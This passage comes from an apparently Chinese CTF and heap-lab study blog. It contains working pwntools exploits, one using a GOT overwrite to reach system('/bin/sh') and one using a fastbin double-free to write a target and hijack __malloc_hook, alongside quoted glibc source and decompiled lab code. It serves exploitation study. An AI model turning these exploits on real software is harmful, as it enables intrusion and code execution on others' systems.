class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br>io = start()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">length, context</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;option---&gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;note content:\n&quot;</span>, <span class="hljs-built_in">str</span>(length))<br>    io.sendlineafter(<span class="hljs-string">&quot;content:\n&quot;</span>, context)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, context</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;option---&gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.sendlineafter(<span class="hljs-string">&quot;content:\n&quot;</span>, context)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;option---&gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;id:\n&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(io)<br>    pause()<br><span class="hljs-comment"># leak the heap addr</span><br><span class="hljs-comment"># dbg()</span><br>io.sendafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x40</span>)<br>heap = u32(io.recvuntil(<span class="hljs-string">b&quot;! Welcome to BCTF&quot;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">4</span>:])<br>log.info(<span class="hljs-string">f&quot;heap_addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># overflow</span><br>io.sendafter(<span class="hljs-string">&quot;Org:\n&quot;</span>, <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x40</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Host:\n&quot;</span>, p32(<span class="hljs-number">0xffffffff</span>))<br><span class="hljs-comment"># dbg()</span><br><br>new((<span class="hljs-number">0x804b0a0</span> - <span class="hljs-number">0x10</span>) - (heap + <span class="hljs-number">0xd0</span>), <span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br><span class="hljs-comment"># new((0xffffffff - (heap + 0xd0) + (0x804b0a0 - 0x10)), b&#x27;aaaa&#x27;)</span><br><span class="hljs-comment"># dbg()</span><br><span class="hljs-comment"># new(0x40, b&quot;a&quot;*0x40)</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span><br>payload += p32(elf.got.free) <span class="hljs-comment"># note[0]</span><br>payload += p32(elf.got.atoi) * <span class="hljs-number">2</span> <span class="hljs-comment"># note[1] note[2]</span><br>new(<span class="hljs-number">0x8c</span>, payload)<br><span class="hljs-comment"># dbg()</span><br><span class="hljs-comment"># free@got.plt -&gt; puts@plt</span><br>edit(<span class="hljs-number">0</span>, p32(elf.plt.puts))<br>dele(<span class="hljs-number">1</span>)<br>atoi_addr = u32(io.recvn(<span class="hljs-number">4</span>))<br>io.recv()<br>libc.address = atoi_addr - libc.sym.atoi<br>log.info(<span class="hljs-string">f&quot;libc addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)<br><br>system_addr = libc.sym.system<br>log.info(<span class="hljs-string">f&quot;system addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.sym.system)&#125;</span>&quot;</span>)<br><span class="hljs-comment"># dbg()</span><br>io.sendline(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>edit(<span class="hljs-number">2</span>, p32(system_addr))<br><br>io.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="Fastbin-Dub"><a href="#Fastbin-Dub" class="headerlink" title="Fastbin Dub"></a>Fastbin Dub</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>利用double-free错误，强制malloc返回一个chunk两次，中间不释放它。这种技术通常是通过破坏fastbin元数据，将一个假的块链接到fastbin中来利用的。这个假块可以被分配，然后程序功能可以被用来读取或写入一个任意的内存位置。</p><h4 id="详情-1"><a href="#详情-1" class="headerlink" title="详情"></a>详情</h4><p>fastbin中double free检查只确保被释放到fastbin中的块不是该bin中的第一个块(链表头部的块、刚刚释放的块)，如果在两个bin之间释放了一个相同大小的不同块，则检查通过。</p><ul><li><p>正常情况:</p><p><img src="Heap.assets/image-20220820160146712.png" alt="image-20220820160146712"></p></li><li><p>double free:</p><p><img src="Heap.assets/image-20220820161049541.png" alt="image-20220820161049541"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>        mchunkptr old = *fb, old2;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">               (i.e., double free).  */</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>)) &#123;<br>                errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">               size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">               only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">               deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>                old_idx = fastbin_index(chunksize(old));<br>            p-&gt;fd = old2 = old;<br>        &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);<br><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="hljs-number">0</span>)) &#123;<br>            errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br></code></pre></td></tr></table></figure></li><li><p>绕过 double free:</p><p><img src="Heap.assets/image-20220820162024274.png" alt="image-20220820162024274"></p></li></ul><p>除此之外，在释放时还会检查当前块的size域与头部域是否相等，由于我们释放的是同一个块，也就不存在该问题。</p><h4 id="如何利用fastbin-dup"><a href="#如何利用fastbin-dup" class="headerlink" title="如何利用fastbin dup"></a>如何利用fastbin dup</h4><p>将一个块二次释放后，我们继续malloc一个相同大小的块，此时malloc将从fastbin中创建块，而不是在top chunk中创建。此时我们往这个块中填写数据就意味着我们正在修改这个块的fd指针，将其修改为一个我们想要的值即可。</p><p><img src="Heap.assets/image-20220820164643151.png" alt="image-20220820164643151"></p><p>但是此过程中也存在着一个对size域的检查措施，因此我们常常使用__malloc_hook前35字节所出现的一个0x7f的大小字段，然后将__malloc_hook修改为one_gadget。所需要注意的是假尺寸字段中不兼容的标志，一个设置的NON_MAIN_ARENA标志和一个清除的 CHUNK_IS_MMAPPED标志会导致一个segfault。能够这样做的原因是，分配既不受对齐检查，也不受标志损坏检查</p><p><img src="Heap.assets/image-20220820181022737.png" alt="image-20220820181022737"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ())) &#123;<br>    idx = fastbin_index (nb);<br>    mfastbinptr *fb = &amp;fastbin (av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span> &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim))<br>             != victim);<br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect(fastbin_index (chunksize(victim)) != idx, <span class="hljs-number">0</span>)) &#123;<br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>            malloc_printerr(check_action, errstr, chunk2mem (victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        check_remalloced_chunk (av, victim, nb);<br>        <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="示例一：fastbin-dup"><a href="#示例一：fastbin-dup" class="headerlink" title="示例一：fastbin_dup"></a>示例一：fastbin_dup</h4><blockquote><p>文件详见附件 <a href="attachment/fastbin_dup/fastbin_dup">fastbin_dup</a></p></blockquote><h5 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h5><ul><li>修改target的值</li><li>获取shell</li></ul><h5 id="检查安全措施-2"><a href="#检查安全措施-2" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/fastbin_dup]<br>└─$ checksec fastbin_dup   <br>[*] <span class="hljs-string">&#x27;/home/fanya/Desktop/heap/heaplab/part1/fastbin_dup/fastbin_dup&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>    RUNPATH:  <span class="hljs-string">&#x27;../.glibc/glibc_2.30_no-tcache&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h5><p>在程序运行时给出了libc的地址，并未阻止double free的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 num; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+14h] [rbp-4Ch]</span><br>  <span class="hljs-type">size_t</span> n; <span class="hljs-comment">// [rsp+18h] [rbp-48h]</span><br>  <span class="hljs-type">unsigned</span> __int64 na; <span class="hljs-comment">// [rsp+18h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> *m_array[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+58h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n===============&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|   HeapLAB   |  Fastbin Dup&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===============\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts() @ %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>);<br>  <span class="hljs-built_in">memset</span>(m_array, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m_array));<br>  index = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter your username: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;user_0, <span class="hljs-number">0x10</span>uLL);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1) malloc %u/%u\n&quot;</span>, index, <span class="hljs-number">7LL</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2) free&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3) target&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4) quit&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>      num = read_num();<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;index: &quot;</span>);<br>      na = read_num();<br>      <span class="hljs-keyword">if</span> ( na &gt;= index )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid index&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">free</span>(m_array[na]);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\ntarget: %s\n&quot;</span>, user_0.target);<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">4</span> )<br>      &#123;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( index &gt; <span class="hljs-number">6</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;maximum requests reached&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>        n = read_num();<br>        <span class="hljs-keyword">if</span> ( n &gt; <span class="hljs-number">0x78</span> )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fast chunks only (120 bytes maximum)&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          m_array[index] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(n);<br>          <span class="hljs-keyword">if</span> ( m_array[index] )<br>          &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>            read(<span class="hljs-number">0</span>, m_array[index++], n);<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;request failed&quot;</span>);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br>pwndbg&gt; ptype user<br>type = <span class="hljs-keyword">struct</span> user &#123;<br>    <span class="hljs-type">char</span> username[<span class="hljs-number">16</span>];<br>    <span class="hljs-type">char</span> target[<span class="hljs-number">16</span>];<br>&#125;<br><span class="hljs-number">00000000</span> user struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x20</span>, copyof_13)   ; XREF: .data:user_0/r<br><span class="hljs-number">00000000</span> username db <span class="hljs-number">16</span> dup(?)<br><span class="hljs-number">00000010</span> target db <span class="hljs-number">16</span> dup(?)<br><span class="hljs-number">00000020</span> user ends<br><span class="hljs-number">00000020</span><br></code></pre></td></tr></table></figure><h5 id="思路分析-》modify"><a href="#思路分析-》modify" class="headerlink" title="思路分析-》modify"></a>思路分析-》modify</h5><ul><li>观察到target在user结构体的中的target，且该结构体的大小为0x20，使用开始的username的输入构造一个虚假的size字段。</li><li>进行fastbin dup，将fd改为user结构体的位置。</li><li>修改target</li></ul><h5 id="漏洞利用-》modify"><a href="#漏洞利用-》modify" class="headerlink" title="漏洞利用-》modify"></a>漏洞利用-》modify</h5><ul><li><p>fastbin dup </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20220820173211603.png" alt="image-20220820173211603"></p></li><li><p>修改fd指针</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># modify fd</span><br>chunk_1 = malloc(<span class="hljs-number">0x28</span>, p64(elf.sym.user))<br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20220820173412011.png" alt="image-20220820173412011"></p></li><li><p>malloc twice</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># malloc_twice</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20220820174021017.png" alt="image-20220820174021017"></p></li><li><p>malloc fake chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># malloc the fake chunk</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;win !&quot;</span>)<br></code></pre></td></tr></table></figure><p>但此时由于我们之前并没有设置虚假的size字段，所以会出现一个中断。如果我们设置了那个虚假的字段，便修改完成</p><p><img src="Heap.assets/image-20220820174213853.png" alt="image-20220820174213853"></p></li><li><p>success</p><p><img src="Heap.assets/image-20220820175408919.png" alt="image-20220820175408919"></p></li></ul><h5 id="exp-》modify"><a href="#exp-》modify" class="headerlink" title="exp-》modify"></a>exp-》modify</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;fastbin_dup&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size &amp; data.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size, data</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># Set the username field.</span><br>username = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>)<br>io.sendafter(<span class="hljs-string">b&quot;username: &quot;</span>, username)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Request two 0x30-sized chunks and fill them with data.</span><br>chunk_A = malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span>)<br>chunk_B = malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># modify fd</span><br>chunk_1 = malloc(<span class="hljs-number">0x28</span>, p64(elf.sym.user))<br><br><span class="hljs-comment"># malloc_twice</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br><br><span class="hljs-comment"># malloc the fake chunk</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;win !&quot;</span>)<br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure><h5 id="思路分析-》drop-shell"><a href="#思路分析-》drop-shell" class="headerlink" title="思路分析-》drop shell"></a>思路分析-》drop shell</h5><ul><li>fastbin dup</li><li>__malloc_hook -&gt; one_gadget</li></ul><h5 id="漏洞利用-》drop-shell"><a href="#漏洞利用-》drop-shell" class="headerlink" title="漏洞利用-》drop shell"></a>漏洞利用-》drop shell</h5><ul><li><p>虚假字段的大小为0x7f -&gt; 意味着我们要申请0x68的chunk。然后fastbin dup 将其fd修改至__malloc_hook - 35 的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Request two 0x30-sized chunks and fill them with data.</span><br>chunk_A = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span>)<br>chunk_B = malloc(<span class="hljs-number">0x68</span>, <span 